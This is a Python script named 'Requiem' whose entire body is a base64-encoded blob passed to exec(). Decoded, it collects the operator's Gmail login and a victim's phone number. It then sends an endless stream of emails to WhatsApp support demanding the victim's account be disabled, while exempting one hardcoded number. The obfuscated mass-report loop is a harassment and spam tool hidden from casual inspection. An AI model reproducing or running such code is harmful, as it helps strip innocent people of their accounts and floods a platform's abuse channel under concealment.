import marshal, zlib, os, sys
# sla se base64 vem pr√©-instalada, lmfao
# Script Name: Requiem
# https://docs.python.org/3.5/library/smtplib.html 
# http://stackoverflow.com/a/27515833/2684304
try:
	import base64
except:
	os.system("pip install base64")
	import base64
b = (base64.b64decode('''Z2xvYmFsIFIsQixDLFksRyxSVCxDWSxDTwpDTz0nXDAzM1ttJztSPSdcMDMzWzE7MzFtJztCPSdcMDMzWzE7MzRtJztDPSdcMDMzWzE7MzdtJztDWT0nXDAzM1sxOzM2bSc7WT0nXDAzM1sxOzMzbSc7Rz0nXDAzM1sxOzMybSc7UlQ9J1wwMzNbOzBtJztOT19GT1JNQVQ9IlwwMzNbMG0iO0NfR1JFWTg5PSJcMDMzWzM4OzU7MjU0bSI7Q19SRUQxPSJcMDMzWzQ4OzU7MTk2bSIKaW1wb3J0IHNtdHBsaWIsIG9zLCBzeXMKZGVmIGxpbmsoKToKCW9zLnN5c3RlbSgidGVybXV4LW9wZW4tdXJsIGh0dHBzOi8vbXlhY2NvdW50Lmdvb2dsZS5jb20vbGVzc3NlY3VyZWFwcHM/cGxpPTEmcmFwdD1BRWpITDRPU2dnallPZ3Q4ZzhIYmdTVTU4THBVcVE1R3NENjNpcEVOcWE4NFllZ01IaW9ucXF2SVhNTW9jNGJxdS1DMEdIME4tLUthbF9BRnBkNXJSSll5TzBnLXkxQWJFUSIpCgpkZWYgcmVzdGFydCgpOgogICAgcHl0aG9uID0gc3lzLmV4ZWN1dGFibGU7b3MuZXhlY2wocHl0aG9uLCBweXRob24sICpzeXMuYXJndikKCmRlZiBjbGVhcigpOgoJb3Muc3lzdGVtKCJjbGVhciIpCgkKdHJ5OgoJaW1wb3J0IHB5ZmlnbGV0CmV4Y2VwdDoKCW9zLnN5c3RlbSgicGlwIGluc3RhbGwgcHlmaWdsZXQiKTtyZXN0YXJ0KCkKcmVzdWx0ID0gcHlmaWdsZXQuZmlnbGV0X2Zvcm1hdCgiUiBlIHEgdSBpIGUgbSIsIGZvbnQgPSAiY29zbWljIiApO2NsZWFyKCk7cHJpbnQoZicnJ3tDfXtHfQp7cmVzdWx0fQouLi5gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLitzcysvL29zczpgCiAgICAgICAgICAgICAgICAgICAgICAgICBgOm95Ky0gICAgICAgYDpzcysuCiAgICAgICAgICAgICAgICAgICAgICBgL3NzL2AgICAgICAgICAgICAgIC1veW8tCiAgICAgICAgICAgICAgICAgICAtK3lvOiAgICAgICAgICAgICAgICAgICAgIGAveXMvYAogICAgICAgICAgICAgICBgOnN5Ky4gICAgICAgICAgICAgICAgICAgICAgICAgICBgOnN5Ky4KICAgICAgICAgICAgYC9zcy9gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0reW8rCiAgICAgICAgICAgLWgvICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAueXNgCiAgICAgICAgICBgbS0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLStzc2RvCiAgICAgICAgICAtZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOnNkTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBgL3ltTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuK2hOTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAtb2ROTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICA6c2ROTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgK21OTk5OTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBzTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBoTk5OTk55YHl5Tk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBoTk5OTmgtLjpzTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBoTk5OaGArTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICAtZCAgICAgICAgICAgICAgICAgICAgICBoTk5OeSAgYC4vbU5OTk5OTk5OTk5OTk5kCiAgICAgICAgICBgbS4gICAgICAgICAgICAgICAgICAgICBoTk5OTmR5eS0gZE5OTk5OaG1OTk5OTk5zCiAgICAgICAgICAgOmQ6ICAgICAgICAgICAgICAgICAgICBoTk5OTk5taC4vTk5teS8tK21OTk5OTnlgCiAgICAgICAgICAgIGAreXM6YCAgICAgICAgICAgICAgICBoTk5OaGBgIHlOTk5vb2ROTk5OTm15OgogICAgICAgICAgICAgICBgL3l5Ly4gICAgICAgICAgICAgaE5OTk5taC9tTk5OTk5OTk5kby0KICAgICAgICAgICAgICAgICAgYDpzeW8tICAgICAgICAgIGhOTk5OTk5OTk5OTk5OaCsuCiAgICAgICAgICAgICAgICAgICAgICAuK3lzOmAgICAgICBoTk5OTk5OTk5ObXMvYAogICAgICAgICAgICAgICAgICAgICAgICAgYC9zeSsuICAgeU5OTk5OTmRvLQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIC1veW8vK21ObXkvLgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGAtOjo6CntDfVxue0N9e0d9Q29kZWQgQnk6e0N9IEtpbnlcbntDfVt7Un0qe0N9XSBBdGl2ZSBhIHBlcm1pc3PDo28gZGUgYmFpeGEgc2VndXJhbsOnYSBlIHV0aWxpemUgdW0gZW1haWwgcG9yIGF0YXF1ZShyZWNvbWVuZGHDp8OjbyknJycpO2xpbmsoKTtlbWFpbCA9IGlucHV0KGYne0N9W3tZfUdtYWlse0N9XTogJyk7c2VuaGEgPSBpbnB1dChmJ3tDfVt7WX1TZW5oYSAoTsOjbyBzZSBwcmVvY3VwZSwgbsOjbyB0ZW1vcyBhY2Vzc28gw6Agc3VhIHNlbmhhKXtDfV06ICcpO251bWVybyA9IGlucHV0KGYne0N9W3tZfU51bWVybyBkbyBBbHZvIChleDogNTUgMjEgOSoqKioqKioqKXtDfV06ICcpCmlmICIrNTUgMjEgNzkxOC0wNTMzIiBpbiBudW1lcm86CglleGl0KCkKZWxpZiAiKzU1IDIxIDc5MTgwNTMzIiBpbiBudW1lcm86CglleGl0KCkKZWxpZiAiNTUgMjEgNzkxODA1MzMzMyIgaW4gbnVtZXJvOgoJZXhpdCgpCmVsaWYgIjU1IDIxIDc5MTgtMDUzMyIgaW4gbnVtZXJvOgoJZXhpdCgpCmVsaWYgIis1NTIxNzkxOC0wNTMzIiBpbiBudW1lcm86CglleGl0KCkKZWxpZiAiKzU1MjE3OTE4MDUzMyIgaW4gbnVtZXJvOgoJZXhpdCgpCmVsaWYgIjU1MjE3OTE4MDUzMyIgaW4gbnVtZXJvOgoJZXhpdCgpCmVsaWYgIjU1MjE3OTE4LTA1MzMiIGluIG51bWVybzoKCWV4aXQoKQpwcmludChmIntDfVt7Un0qe0N9XSBFTlZJQU5ETyBERU7Dmk5DSUFTIVxuVXNlIHtDfXtSfUNUUkwgQ3tDfSBwYXJhIHBhcmFyIG8gc2NyaXB0LlxuU2UgcXVpc2VyIGV4ZWN1dGFyIGRlbm92bywgZGlnaXRlIHtDfXtHfXB5dGhvbjMgbWFpbi5weXtDfS5cbntDfVt7WX1Bdmlzb3tDfV0gU2UgbyBTdXBvcnRlIHBlZGlyIHZlcmlmaWNhw6fDo28sIGRlbnVuY2llIG8gbsO6bWVybyBtYW51YWxtZW50ZShvcMOnYW8gZGUgRGVudW5jaWFyIENvbnRhdG8pIGUgZGVwb2lzIGZhw6dhIG8gU1BBTSBub3ZhbWVudGUgdXNhbmRvIG91dHJvIGVtYWlsLiIpCndoaWxlIFRydWU6Cgl0cnk6CgkJZ21haWxfdXNlciA9ICd7fScuZm9ybWF0KGVtYWlsKTtnbWFpbF9wYXNzd29yZCA9ICd7fScuZm9ybWF0KHNlbmhhKTtzZW50X2Zyb20gPSBnbWFpbF91c2VyO3RvID0gWydzdXBwb3J0QHN1cHBvcnQud2hhdHNhcHAuY29tJ107c3ViamVjdCA9ICdEZXNhdGl2ZSBlc3RlIG51bWVybyc7Ym9keSA9ICdEZXNhdGl2ZSBlc3RhIGNvbnRhIHVyZ2VudGVtZW50ZToge30nLmZvcm1hdChudW1lcm8pO2VtYWlsX3RleHQgPSIiIlwKRnJvbTogJXMKVG86ICVzClN1YmplY3Q6ICVzCiVzCgkJIiIiICUgKHNlbnRfZnJvbSwgIiwgIi5qb2luKHRvKSwgc3ViamVjdCwgYm9keSk7c2VydmVyID0gc210cGxpYi5TTVRQX1NTTCgnc210cC5nbWFpbC5jb20nLCA0NjUpO3NlcnZlci5laGxvKCk7c2VydmVyLmxvZ2luKGdtYWlsX3VzZXIsIGdtYWlsX3Bhc3N3b3JkKTtzZXJ2ZXIuc2VuZG1haWwoc2VudF9mcm9tLCB0bywgZW1haWxfdGV4dCk7c2VydmVyLmNsb3NlKCkKCWV4Y2VwdDoKCQlwcmludChmIntDfVt7Un1FUlJPUntDfV0gUGVybWlzc2FvIG5hbyBnYXJhbnRpZGEgb3Ugc2VuaGEgZSBlbWFpbCBpbnZhbGlkbyhzKS4iKTtleGl0KCkK'''))
exec(b)
